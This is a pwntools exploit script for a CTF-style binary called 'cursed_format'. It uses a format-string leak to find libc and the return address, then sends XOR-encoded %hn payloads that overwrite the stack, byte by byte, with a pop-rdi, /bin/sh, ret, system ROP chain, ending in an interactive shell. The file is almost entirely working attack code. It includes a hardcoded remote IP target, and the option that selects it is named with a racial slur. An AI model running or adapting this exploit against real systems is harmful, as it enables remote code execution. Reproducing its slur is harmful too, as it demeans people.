#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or '../cursed_format', checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.log_level = 'warning'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 8888)
    elif args.NIGGER:
        return remote("18.212.136.134", 8887)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+153
b *main+224
continue
'''.format(**locals())

def logleak(name: str, addr: int): print(f"[*] " + name + " = %#x" % addr)

def enc(buf: bytes, key=b'\xff' * 0x20):
    return b''.join([p8(b ^ key[i % len(key)]) for (i, b) in enumerate(buf)]).ljust(FMTSIZE, b'\x00')

FMTSIZE = 0x20
win_idx = 10

io = start()

## 16 -> pie leak (remote) -> main+15
## 17 -> __libc_start_main+234 (remote)
payload = b'%19$p--%1$p\n'.ljust(FMTSIZE, b'\x00')



key = payload

io.sendlineafter(b'>> ', b'1')
enc1 = enc(payload)
io.send(enc1)


output = io.recvline()
leak = output.strip().split(b'--')
libc.address = int(leak[0], 16) - 0x29d90
ret_addr = int(leak[1], 16) + 0x38
logleak('return_addr', ret_addr)
logleak('glibc base', libc.address)
gadgets = ROP(libc)


io.sendlineafter(b'>> ', b'1')
aux = b'\x00' * FMTSIZE
io.send(aux)



# First gadget -> pop rdi

pop_rdi = libc.address + 0x000000000002a3e5 #gadgets.rdi.address

logleak("pop_rdi location", pop_rdi)

io.sendlineafter(b'>> ', b'1')

pop_rdi_off = (pop_rdi & 0xff0000) >> 16



aux = (b'%' + str(pop_rdi_off).encode() + b'c%' + str(win_idx).encode() + b'$hhn') 
aux = aux.ljust(0x10, b'A')
aux += flat(ret_addr + 2)
aux += flat(0x0)

#aux = (b'%10$p -- aaaaa' + b'BBBBBBBB').ljust(FMTSIZE, b'\x00')

print(f"[*] pop rdi 3rd byte payload = {aux}")

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

io.clean()
# second phase

io.sendline(b'1')
aux = b'\x00' * FMTSIZE
io.send(aux)

io.sendlineafter(b'>> ', b'1')

pop_rdi_off = (pop_rdi & 0xffff)

print(f"[*] last 2 bytes -> 0x{pop_rdi_off:x}")

aux = (b'%' + str(pop_rdi_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(ret_addr)
aux += flat(0x0)

print(f"[*] pop rdi last 2 bytes payload = {aux}")

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### WRITE BINSH ADDRESS ### 0xXXXXYYYYXXXX
io.sendlineafter(b'>> ', b'1')
aux = b'\x00' * FMTSIZE


io.send(aux)


target_addr = ret_addr + 8
binsh = next(libc.search(b"/bin/sh\0"))
logleak("/bin/sh stack location", target_addr)
logleak("/bin/sh libc location", binsh)

io.sendlineafter(b'>> ', b'1')

binsh_off = (binsh & 0xffff0000) >> 16

aux = (b'%' + str(binsh_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+2)
aux += flat(0x0)

print(f"[*] /bin/sh 3rd and 4th byte payload = {aux}")

print(f"logging key = {key} with 6th and 7th byte binsh payload")

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)


### 0xXXXXXXXXYYYY

io.sendlineafter(b'>> ', b'1')

binsh_off = (binsh & 0xffff)

aux = (b'%' + str(binsh_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr)
aux += flat(0x0)

print(f"[*] /bin/sh 7th and 8th byte payload = {aux}")

print(f"logging key = {key} with 3rd and 4th byte binsh payload")

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### 0xYYYYXXXXXXXX

io.sendlineafter(b'>> ', b'1')

binsh_off = (binsh & 0xffff00000000) >> 32

aux = (b'%' + str(binsh_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+4)
aux += flat(0x0)

print(f"[*] /bin/sh 1th and 8th byte payload = {aux}")

print(f"logging key = {key} with 3rd and 4th byte binsh payload")

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### WRITE ret

io.sendlineafter(b'>> ', b'1')

target_addr = ret_addr + 0x10
ret = gadgets.ret.address

logleak('ret', ret)


ret_off = (ret & 0xffff)

aux = (b'%' + str(ret_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

#### Next bytes



io.sendlineafter(b'>> ', b'1')
ret_off = (ret & 0xffff0000) >> 16

aux = (b'%' + str(ret_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+2)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### last two bytes

io.sendlineafter(b'>> ', b'1')
ret_off = (ret & 0xffff00000000) >> 32

aux = (b'%' + str(ret_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+4)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### WRITE system

io.sendlineafter(b'>> ', b'1')

target_addr = ret_addr + 0x18
system = libc.sym.system

logleak('system', system)


system_off = (system & 0xffff)

aux = (b'%' + str(system_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

#### Next bytes

io.sendlineafter(b'>> ', b'1')
system_off = (system & 0xffff0000) >> 16

aux = (b'%' + str(system_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+2)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)

### last two bytes

io.sendlineafter(b'>> ', b'1')
system_off = (system & 0xffff00000000) >> 32

aux = (b'%' + str(system_off).encode() + b'c%' + str(win_idx).encode() + b'$hn') 
aux = aux.ljust(0x10, b'A')
aux += flat(target_addr+4)
aux += flat(0x0)

enc2 = enc(aux, key=key)

key = aux

io.send(enc2)


io.interactive()

